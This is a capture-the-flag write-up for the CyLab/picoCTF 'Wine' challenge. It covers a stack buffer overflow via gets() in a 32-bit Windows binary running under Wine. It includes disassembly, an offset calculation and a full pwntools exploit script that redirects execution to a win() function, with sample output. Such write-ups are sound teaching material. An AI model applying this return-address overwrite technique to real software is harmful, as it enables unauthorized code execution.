# CyLab — Wine

* **Platform:** CyLab Security Academy / picoCTF (Challenge ID: `317`)
* **Category:** Binary Exploitation / Windows PE32 on Wine (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, radare2, objdump
* **Binary:** `vuln.exe` (PE32 x86 Windows executable running under Wine)

---

## TL;DR

The challenge hosts a 32-bit Windows executable (`vuln.exe`) wrapped inside a Linux Wine emulation environment. Static analysis reveals that `vuln()` reads user input using the unsafe Windows CRT function `gets()` into a 136-byte stack buffer (`[ebp-0x88]`). Because PE32 binaries without dynamic base (ASLR) load at a fixed image base of `0x400000`, the built-in `win()` function is permanently positioned at `0x0040151c`. Sending 140 bytes of padding followed by `0x0040151c` overwrites the saved instruction pointer, calling `win()` to output the flag before the process terminates.

---

## Recon

### Binary Information

Running `file`:

```text
$ file vuln.exe
vuln.exe: PE32 executable (console) Intel 80386, for MS Windows, 9 sections
```

Key observations:
1. **Windows PE Architecture:** The binary uses Windows x86 stdcall / cdecl calling conventions with PE header structures.
2. **Fixed Image Base (No ASLR):** The binary has `IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE` disabled; code sections map statically to base `0x00400000`.
3. **Execution Environment:** The challenge service runs `wine vuln.exe` on Linux, capturing standard console I/O over a TCP socket.

---

## Static Analysis & Vulnerability

### 1. Disassembly of `vuln()`

Inspecting `vuln()` disassembly using `radare2` (`r2 vuln.exe`) or IDA:

```asm
0x0040155b <+0>:     push   ebp
0x0040155c <+1>:     mov    ebp, esp
0x0040155e <+3>:     sub    esp, 0x98
0x00401564 <+9>:     lea    eax, [ebp-0x88]     ; buf allocated at [ebp - 0x88] (136 bytes)
0x0040156a <+15>:    mov    DWORD PTR [esp], eax
0x0040156d <+18>:    call   0x4018e0 <gets>     ; Unbounded stack read
0x00401572 <+23>:    leave
0x00401573 <+24>:    ret
```

Stack frame mapping:

```text
       Lower Addresses (Stack Top)
  +----------------------------------+  [ebp - 0x88]
  |         buf[136]                 |  (136 bytes user input)
  +----------------------------------+  [ebp]
  |       Saved EBP (4 bytes)        |  (4 bytes frame pointer)
  +----------------------------------+  [ebp + 0x04]
  |       Saved EIP (4 bytes)        |  (Target: win() at 0x0040151c)
  +----------------------------------+
       Higher Addresses
```

Offset calculation:
$$\text{Offset} = 0\text{x}88 + 4 = 136 + 4 = 140 \text{ bytes}$$

### 2. Identifying `win()`

Disassembling `win()` at `0x0040151c`:

```asm
0x0040151c <+0>:     push   ebp
0x0040151d <+1>:     mov    ebp, esp
0x0040151f <+3>:     sub    esp, 0x58
0x00401522 <+6>:     mov    DWORD PTR [esp+4], 0x403024   ; "r"
0x0040152a <+14>:    mov    DWORD PTR [esp], 0x403018     ; "flag.txt"
0x00401531 <+21>:    call   0x4018d0 <fopen>
...
0x0040154e <+50>:    call   0x4018c0 <printf>             ; Outputs flag
```

Target address: `0x0040151c`.

---

## Dynamic Analysis & Exploitation Strategy

1. **Payload Layout:**
   - 140 bytes of filler (`b"A" * 140`) to consume `buf` and overwrite saved EBP.
   - 4 bytes containing `p32(0x0040151c)`.
2. **Handling the Wine Process Exit:**
   Because `win()` does not execute `exit(0)`, it attempts to return to an unmapped stack address after printing the flag, causing a Wine crash dump. The exploit reads all output until EOF and regex-extracts the flag token.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "i386"
context.log_level = "info"

HOST, PORT = "chatelaine.cylabacademy.net", 33407
WIN = 0x0040151c
OFFSET = 140

def solve(io):
    io.recvuntil(b"Give me a string that gets you a flag\n")

    # 140 bytes padding + address of win()
    payload = b"A" * OFFSET + p32(WIN)
    io.sendline(payload)

    # Read output and parse flag before wine dump
    data = io.recvall(timeout=4)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = process(["wine", "./vuln.exe"]) if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to chatelaine.cylabacademy.net on port 33407: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 33407
```

---

## Key Takeaways & Lessons

1. **Static Analysis of PE32 Binaries on Linux:** Linux reversing tools (`radare2`, `objdump`, `readelf`) disassemble PE32 binaries as cleanly as ELF executables without needing a Windows VM.
2. **Deterministic PE Loading Without ASLR:** Legacy Windows binaries without Dynamic Base compile with a default image base of `0x400000`, making control-flow redirection identical to non-PIE Linux binaries.
3. **Exploiting Wine Wrappers:** In containerized Wine challenges, standard I/O streams are piped through the host TCP socket, allowing Linux pwntools scripts to exploit Windows binaries seamlessly.
